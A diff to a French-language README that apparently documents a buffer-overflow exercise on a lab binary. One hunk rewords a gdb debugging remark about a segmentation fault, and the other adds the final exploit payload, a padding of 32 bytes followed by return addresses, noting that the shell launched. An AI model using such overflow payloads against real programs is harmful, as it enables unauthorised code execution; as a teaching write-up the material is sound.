@@ -367,7 +367,7 @@ Program received signal SIGSEGV, Segmentation fault.
 148	../sysdeps/posix/system.c: No such file or directory.
 ```
 
-On est bien au message de succès, mais on tombe ensuite sur un SIGSEV. Allons voir où le programme plante exactement 
+On est bien au message de succès, mais on tombe ensuite sur un SIGSEV. Allons voir où le programme s'arrête exactement : 
 
 ```console
 (gdb) 
@@ -472,6 +472,7 @@ coucou
 ls
 exploit.py  list_directory  README.md
 ```
+Le shell c'est bien lancé, le payload final est donc "\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
 
 # Script
 
